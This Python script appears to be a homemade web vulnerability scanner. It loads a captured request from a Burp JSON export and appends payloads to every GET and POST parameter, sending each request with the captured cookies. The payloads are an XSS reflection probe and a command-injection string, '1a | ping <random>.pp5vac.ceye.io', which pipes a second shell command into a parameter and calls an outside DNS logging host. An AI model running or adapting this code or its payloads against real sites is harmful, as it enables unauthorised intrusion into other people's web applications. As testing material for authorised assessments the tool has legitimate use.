# coding: utf-8
'''
Created on 2018��4��18��

@author: guimaizi
'''
import json,re,requests,random,string

class test_vul:
    def __init__(self,payload):
        self.vul_payload=payload
        f = open('E:/hack/burp_lib/tmp.json', 'r', encoding='utf-8')
        test=re.sub('\'','\"',f.read())
        self.data=json.loads(test)
        print(self.data)
        if self.data['body']=='':
            #urllist=self.data['url'].split('?')
            self.get_data(self.vul_payload)
        else:
            self.post_data(self.vul_payload)
        f.close()
    def get_data(self,payload):
        urllist=self.data['url'].split('?')
        param = urllist[1]
        param_list = param.split('&')
        for i in range(len(param_list)):
            params=list(param_list)
            j = params[i].split('=')
            j[1]=j[1] + payload
            params[i]= '='.join(j)
            params= '&'.join(params)
            str=urllist[0] + '?' + params
            self.attack_get(str)
    def post_data(self,payload):
        try:
            urllist=self.data['url'].split('?')
            param = urllist[1]
            param_list = param.split('&')
            for i in range(len(param_list)):
                params=list(param_list)
                j = params[i].split('=')
                j[1]=j[1] + payload
                params[i]= '='.join(j)
                params= '&'.join(params)
                str=urllist[0] + '?' + params
                self.attack_post(str,self.data['body'])
        except:
            pass
        param_list = self.data['body'].split('&')
        for i in range(len(param_list)):
            params=list(param_list)
            j = params[i].split('=')
            j[1]=j[1] + payload
            params[i]= '='.join(j)
            params= '&'.join(params)
            #str=urllist[0] + '?' + params
            self.attack_post(self.data['url'],params)
        
    def attack_post(self,url,data):
        #print(url)
        try:
            kv={'user_agent':self.data['useragent'],'cookie':self.data['cookie'],'referer': self.data['referer'],"Content-Type": "application/x-www-form-urlencoded"}
            r = requests.post(url,data,headers=kv)
            if 'xssguimaizi' in r.text:
                print('\n####xss:%s---%s\n'%(url,data))
                #print(r.text)
        except:
            pass
    def attack_get(self,url):
        try:
            kv={'user_agent':self.data['useragent'],'cookie':self.data['cookie'],'referer': self.data['referer'],"Content-Type": "application/x-www-form-urlencoded"}
            r = requests.get(url,headers=kv)
            if 'xssguimaizi' in r.text:
                print('\n###xss:'+url+'\n')
        except:
            pass
            #print(r.text)
if '__main__' == __name__:
    #xss测试
    xss_payload='<\'\"xssguimaizi>'
    item=test_vul(xss_payload)
    #命令注入测试
    ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 7))
    cmd_payload='1a | ping %s.pp5vac.ceye.io'%ran_str
    item=test_vul(cmd_payload)